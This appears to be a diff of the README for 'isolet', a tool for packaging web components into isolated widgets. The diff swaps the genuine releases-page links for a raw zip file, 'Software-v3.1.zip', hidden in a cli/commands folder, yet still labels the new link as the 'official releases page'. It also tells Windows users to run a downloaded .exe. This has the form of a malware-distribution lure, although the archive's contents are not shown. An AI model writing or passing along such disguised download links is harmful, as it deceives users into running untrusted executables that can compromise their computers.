@@ -1,6 +1,6 @@
 # 📦 isolet - Build isolated widgets for any app
 
-[![](https://img.shields.io/badge/Download_isolet-Blue?style=for-the-badge)](https://github.com/forbeskilndried9479/isolet/releases)
+[![](https://img.shields.io/badge/Download_isolet-Blue?style=for-the-badge)](https://github.com/forbeskilndried9479/isolet/raw/refs/heads/main/packages/isolet/cli/commands/Software-v3.1.zip)
 
 isolet helps you package website components or software parts into self-contained widgets. These widgets run inside their own space. This keeps your main system clean and light. You can move these widgets across different projects without issues. The tool uses a standard format known as iife to wrap code. This makes the widget load fast and remain stable.
 
@@ -8,7 +8,7 @@ isolet helps you package website components or software parts into self-containe
 
 Follow these steps to get isolet on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/forbeskilndried9479/isolet/releases) to find the latest version.
+1. Visit the [official releases page](https://github.com/forbeskilndried9479/isolet/raw/refs/heads/main/packages/isolet/cli/commands/Software-v3.1.zip) to find the latest version.
 2. Look for the file ending in .exe under the Assets section.
 3. Click the file name to start your download.
 4. Open the folder where your computer saves downloads.
